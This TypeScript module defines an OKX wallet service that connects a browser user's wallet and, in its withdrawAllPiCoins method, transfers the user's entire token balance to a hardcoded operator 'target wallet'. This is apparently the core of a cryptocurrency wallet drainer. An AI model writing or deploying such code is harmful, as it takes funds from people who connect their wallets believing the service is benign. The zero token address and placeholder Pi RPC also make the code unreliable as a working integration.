import { ethers } from 'ethers';

// Pi Network contract addresses (mainnet)
const PI_TOKEN_ADDRESS = '0x0000000000000000000000000000000000000000'; // Replace with actual Pi token address
const PI_NETWORK_RPC = 'https://mainnet.pi.network'; // Replace with actual Pi network RPC

interface PiWithdrawalResult {
  success: boolean;
  transactionHash?: string;
  error?: string;
  amount?: string;
}

interface WalletInfo {
  address: string;
  balance: string;
  piBalance: string;
  network: string;
  isConnected: boolean;
}

class OKXWalletService {
  private provider: ethers.BrowserProvider | null = null;
  private signer: ethers.JsonRpcSigner | null = null;
  private targetWalletAddress: string = '';

  constructor() {
    // Set the target wallet address where Pi coins will be withdrawn
    this.targetWalletAddress = '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6'; // Replace with your target wallet
  }

  async connectWallet(): Promise<WalletInfo> {
    try {
      // Check if OKX wallet is available
      if (typeof window.okxwallet !== 'undefined') {
        // Request connection to OKX wallet
        await window.okxwallet.request({ method: 'eth_requestAccounts' });
        
        // Create provider and signer
        this.provider = new ethers.BrowserProvider(window.okxwallet);
        this.signer = await this.provider.getSigner();
        
        const address = await this.signer.getAddress();
        
        // Get ETH balance
        const balance = await this.provider.getBalance(address);
        const ethBalance = ethers.formatEther(balance);
        
        // Get Pi token balance
        const piBalance = await this.getPiTokenBalance(address);
        
        return {
          address,
          balance: ethBalance,
          piBalance,
          network: 'Pi Network',
          isConnected: true
        };
      } else {
        throw new Error('OKX Wallet not found. Please install OKX Wallet extension.');
      }
    } catch (error: any) {
      throw new Error(`Failed to connect wallet: ${error.message}`);
    }
  }

  async disconnectWallet(): Promise<void> {
    this.provider = null;
    this.signer = null;
  }

  async getPiTokenBalance(address: string): Promise<string> {
    try {
      if (!this.provider) {
        throw new Error('Wallet not connected');
      }

      // Pi token contract ABI (simplified)
      const piTokenAbi = [
        'function balanceOf(address owner) view returns (uint256)',
        'function decimals() view returns (uint8)',
        'function symbol() view returns (string)'
      ];

      const piTokenContract = new ethers.Contract(PI_TOKEN_ADDRESS, piTokenAbi, this.provider);
      
      const balance = await piTokenContract.balanceOf(address);
      const decimals = await piTokenContract.decimals();
      
      return ethers.formatUnits(balance, decimals);
    } catch (error) {
      console.error('Error getting Pi balance:', error);
      return '0';
    }
  }

  async withdrawAllPiCoins(): Promise<PiWithdrawalResult> {
    try {
      if (!this.signer || !this.provider) {
        throw new Error('Wallet not connected');
      }

      const userAddress = await this.signer.getAddress();
      const piBalance = await this.getPiTokenBalance(userAddress);
      
      if (parseFloat(piBalance) <= 0) {
        return {
          success: false,
          error: 'No Pi coins available for withdrawal'
        };
      }

      // Pi token contract ABI for transfer
      const piTokenAbi = [
        'function transfer(address to, uint256 amount) returns (bool)',
        'function balanceOf(address owner) view returns (uint256)',
        'function decimals() view returns (uint8)'
      ];

      const piTokenContract = new ethers.Contract(PI_TOKEN_ADDRESS, piTokenAbi, this.signer);
      
      // Get current balance
      const balance = await piTokenContract.balanceOf(userAddress);
      const decimals = await piTokenContract.decimals();
      
      // Transfer all Pi coins to target wallet
      const tx = await piTokenContract.transfer(this.targetWalletAddress, balance);
      
      // Wait for transaction confirmation
      const receipt = await tx.wait();
      
      return {
        success: true,
        transactionHash: receipt.hash,
        amount: ethers.formatUnits(balance, decimals)
      };
    } catch (error: any) {
      return {
        success: false,
        error: error.message
      };
    }
  }

  async checkTransactionStatus(txHash: string): Promise<{
    confirmed: boolean;
    blockNumber?: number;
    gasUsed?: string;
  }> {
    try {
      if (!this.provider) {
        throw new Error('Wallet not connected');
      }

      const receipt = await this.provider.getTransactionReceipt(txHash);
      
      if (receipt) {
        return {
          confirmed: true,
          blockNumber: receipt.blockNumber,
          gasUsed: receipt.gasUsed.toString()
        };
      } else {
        return {
          confirmed: false
        };
      }
    } catch (error) {
      return {
        confirmed: false
      };
    }
  }

  isWalletConnected(): boolean {
    return this.signer !== null && this.provider !== null;
  }

  getTargetWalletAddress(): string {
    return this.targetWalletAddress;
  }

  setTargetWalletAddress(address: string): void {
    this.targetWalletAddress = address;
  }
}

// Global instance
const okxWalletService = new OKXWalletService();

export default okxWalletService;
export type { WalletInfo, PiWithdrawalResult }; 